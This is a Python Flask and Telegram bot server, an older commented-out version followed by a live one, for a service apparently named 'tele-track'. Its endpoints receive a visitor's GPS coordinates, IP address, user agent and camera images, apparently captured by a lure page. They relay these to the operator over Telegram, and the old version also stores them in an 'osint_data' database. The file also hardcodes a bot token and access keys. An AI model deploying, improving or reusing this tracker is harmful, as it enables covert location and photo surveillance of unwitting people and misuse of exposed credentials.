# import os
# import sqlite3
# from datetime import datetime
# from flask import Flask, request, jsonify, send_file
# from telegram import Update, Bot
# from telegram.ext import (
#     ApplicationBuilder,
#     CommandHandler,
#     ContextTypes,
# )
# import asyncio
# import requests

# # -------------------- Config --------------------
# TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"
# AUTHORIZED_KEY = "secretkey123"
# WEBHOOK_URL = "https://tele-track-syk8.onrender.com/webhook"  # Replace if different

# SAVE_FOLDER = "saved_files"
# os.makedirs(SAVE_FOLDER, exist_ok=True)
# authenticated_users = set()

# # -------------------- Flask App --------------------
# app = Flask(__name__)

# # -------------------- Telegram Bot --------------------
# bot = Bot(token=TELEGRAM_BOT_TOKEN)
# application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

# # -------------------- DB Setup --------------------
# def init_db():
#     conn = sqlite3.connect('osint_data.db')
#     c = conn.cursor()
#     c.execute('''
#         CREATE TABLE IF NOT EXISTS osint_data (
#             id INTEGER PRIMARY KEY AUTOINCREMENT,
#             type TEXT,
#             latitude REAL,
#             longitude REAL,
#             accuracy REAL,
#             timestamp TEXT,
#             ip_address TEXT,
#             user_agent TEXT,
#             file_path TEXT
#         )
#     ''')
#     conn.commit()
#     conn.close()

# init_db()

# # -------------------- Telegram Utils --------------------
# def send_telegram_message(message):
#     for user_id in authenticated_users:
#         bot.send_message(chat_id=user_id, text=message, parse_mode="Markdown")

# def send_telegram_image(image_path, caption=""):
#     for user_id in authenticated_users:
#         with open(image_path, "rb") as photo:
#             bot.send_photo(chat_id=user_id, photo=photo, caption=caption)

# # -------------------- Command Handlers --------------------
# async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     user_id = update.effective_user.id
#     if user_id not in authenticated_users:
#         await update.message.reply_text("🔒 Please authenticate using /auth <key>")
#         return
#     await update.message.reply_text("✅ Server is live and bot is running!")

# async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     user_id = update.effective_user.id
#     if not context.args:
#         await update.message.reply_text("Usage: /auth <key>")
#         return
#     if context.args[0] == AUTHORIZED_KEY:
#         authenticated_users.add(user_id)
#         await update.message.reply_text("🔑 Authenticated successfully!")
#     else:
#         await update.message.reply_text("❌ Invalid key!")

# async def chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     await update.message.reply_text(f"🆔 Your chat ID: {update.effective_user.id}")

# async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
#     user_id = update.effective_user.id
#     if user_id not in authenticated_users:
#         await update.message.reply_text("🔒 You are not authenticated.")
#         return

#     deleted_files = 0
#     for file in os.listdir(SAVE_FOLDER):
#         file_path = os.path.join(SAVE_FOLDER, file)
#         if os.path.isfile(file_path):
#             os.remove(file_path)
#             deleted_files += 1

#     conn = sqlite3.connect('osint_data.db')
#     c = conn.cursor()
#     c.execute("DELETE FROM osint_data")
#     conn.commit()
#     conn.close()

#     await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")

# # Register handlers
# application.add_handler(CommandHandler("start", start))
# application.add_handler(CommandHandler("auth", auth))
# application.add_handler(CommandHandler("chatid", chatid))
# application.add_handler(CommandHandler("delete", delete))

# # -------------------- Webhook Route --------------------
# @app.route('/webhook', methods=['POST'])
# def webhook():
#     try:
#         data = request.get_json(force=True)
#         update = Update.from_dict(data)
#         asyncio.run(application.process_update(update))
#     except Exception as e:
#         print("Webhook error:", e)
#     return "OK"

# # -------------------- Other Routes --------------------
# @app.route('/')
# def index():
#     return send_file('index.html')  # Or change to static/index.html if needed

# @app.route('/location', methods=['POST'])
# def receive_location():
#     data = request.get_json()
#     ip_address = request.remote_addr or "Unknown IP"
#     user_agent = request.headers.get('User-Agent', 'Unknown User Agent')

#     lat = data.get('latitude')
#     lon = data.get('longitude')
#     accuracy = data.get('accuracy', 'Unknown')

#     # Save to DB
#     conn = sqlite3.connect('osint_data.db')
#     c = conn.cursor()
#     c.execute('''
#         INSERT INTO osint_data (type, latitude, longitude, accuracy, timestamp, ip_address, user_agent)
#         VALUES (?, ?, ?, ?, ?, ?, ?)
#     ''', ("location", lat, lon, accuracy, datetime.utcnow().isoformat(), ip_address, user_agent))
#     conn.commit()
#     conn.close()

#     # Telegram Message
#     message = (
#         f"📍 *New Location Received:*\n"
#         f"Latitude: `{lat}`\n"
#         f"Longitude: `{lon}`\n"
#         f"Accuracy: ±{accuracy} m\n"
#         f"[📍 View on Map](https://www.google.com/maps?q={lat},{lon})\n"
#         f"IP: `{ip_address}`\n"
#         f"User Agent: `{user_agent}`"
#     )
#     send_telegram_message(message)
#     return jsonify({"status": "OK"}), 200

# @app.route('/upload_image', methods=['POST'])
# def upload_image():
#     if 'image' not in request.files:
#         return jsonify({"error": "No image uploaded"}), 400

#     image_file = request.files['image']
#     timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
#     filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
#     image_file.save(filename)

#     conn = sqlite3.connect('osint_data.db')
#     c = conn.cursor()
#     c.execute('''
#         INSERT INTO osint_data (type, file_path, timestamp)
#         VALUES (?, ?, ?)
#     ''', ("image", filename, datetime.utcnow().isoformat()))
#     conn.commit()
#     conn.close()

#     send_telegram_image(filename, caption="🖼️ New Image Uploaded")
#     return jsonify({"status": "OK"}), 200

# # -------------------- Main --------------------
# if __name__ == '__main__':
#     # Set webhook
#     resp = requests.get(
#         f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook",
#         params={"url": WEBHOOK_URL}
#     )
#     print("📡 Set Webhook:", resp.json())

#     # Start Flask server
#     print("🚀 Starting server on Render...")
#     app.run(host='0.0.0.0', port=5000)


# 8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0
# https://tele-track-syk8.onrender.com

from flask import Flask, request, jsonify, send_file
from datetime import datetime
import os
import traceback
import requests
import asyncio

from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes

# -------------------- Flask Setup --------------------
app = Flask(__name__)

# -------------------- Folder Setup --------------------
SAVE_FOLDER = "saved_files"
os.makedirs(SAVE_FOLDER, exist_ok=True)

# -------------------- Telegram Bot Setup --------------------
TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"
AUTHORIZED_KEY = "ztrack577802"
WEBHOOK_URL = "https://tele-track-uefk.onrender.com/webhook"

authenticated_users = set()

bot = Bot(token=TELEGRAM_BOT_TOKEN)
application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

# -------------------- Telegram Handlers --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 Please authenticate using /auth <key>")
        return
    await update.message.reply_text("✅ Server is live!")

async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /auth <key>")
        return
    if context.args[0] == AUTHORIZED_KEY:
        authenticated_users.add(user_id)
        await update.message.reply_text("🔑 Authenticated successfully!")
    else:
        await update.message.reply_text("❌ Invalid key!")

async def chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your chat ID: {update.effective_user.id}")

async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in authenticated_users:
        await update.message.reply_text("🔒 You are not authenticated.")
        return

    deleted_files = 0
    for file in os.listdir(SAVE_FOLDER):
        file_path = os.path.join(SAVE_FOLDER, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
            deleted_files += 1

    await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) from saved_files.")

application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("auth", auth))
application.add_handler(CommandHandler("chatid", chatid))
application.add_handler(CommandHandler("delete", delete))

# -------------------- Telegram Utilities --------------------
def send_telegram_message(message):
    for user_id in authenticated_users:
        try:
            asyncio.run(bot.send_message(chat_id=user_id, text=message, parse_mode="Markdown"))
        except Exception as e:
            print("❌ Telegram message error:", e)

def send_telegram_image(filepath, caption=""):
    for user_id in authenticated_users:
        try:
            with open(filepath, "rb") as photo:
                asyncio.run(bot.send_photo(chat_id=user_id, photo=photo, caption=caption))
        except Exception as e:
            print("❌ Telegram image error:", e)

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    return send_file('index.html')

@app.route('/location', methods=['POST'])
def receive_location():
    try:
        data = request.get_json()
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')

        msg = (
            "\U0001F4CD *New Location Received:*\n"
            f"Latitude: `{data['latitude']}`\n"
            f"Longitude: `{data['longitude']}`\n"
            f"Accuracy: ±{data['accuracy']} m\n"
            f"[\U0001F4CD View on Map](https://www.google.com/maps?q={data['latitude']},{data['longitude']})\n"
            f"IP: `{ip_address}`\n"
            f"UA: `{user_agent}`"
        )
        send_telegram_message(msg)
        return jsonify({"status": "OK"}), 200
    except Exception as e:
        print("❌ Location error:", e)
        traceback.print_exc()
        return jsonify({"error": "Location failed"}), 500

@app.route('/upload_image', methods=['POST'])
def upload_image():
    try:
        if 'image' not in request.files:
            return jsonify({"error": "No image uploaded"}), 400

        image_file = request.files['image']
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(SAVE_FOLDER, f"image_{timestamp}.jpg")
        image_file.save(filename)

        send_telegram_image(filename, caption="\U0001F5BC️ New Image Captured")
        return jsonify({"status": "OK"}), 200
    except Exception as e:
        print("❌ Upload error:", e)
        traceback.print_exc()
        return jsonify({"error": "Upload failed"}), 500

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    try:
        update = Update.de_json(request.get_json(force=True), bot)
        asyncio.ensure_future(application.process_update(update))
        return "OK", 200
    except Exception as e:
        print("❌ Webhook error:", e)
        traceback.print_exc()
        return "Webhook Failed", 500

# -------------------- Main Startup --------------------
if __name__ == "__main__":
    import asyncio

    async def startup():
        print("🚀 Starting bot and setting webhook...")
        await application.initialize()
        await bot.delete_webhook()  # Optional: reset any old webhooks
        await bot.set_webhook(WEBHOOK_URL)
        print(f"✅ Webhook set to: {WEBHOOK_URL}")

    asyncio.run(startup())

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)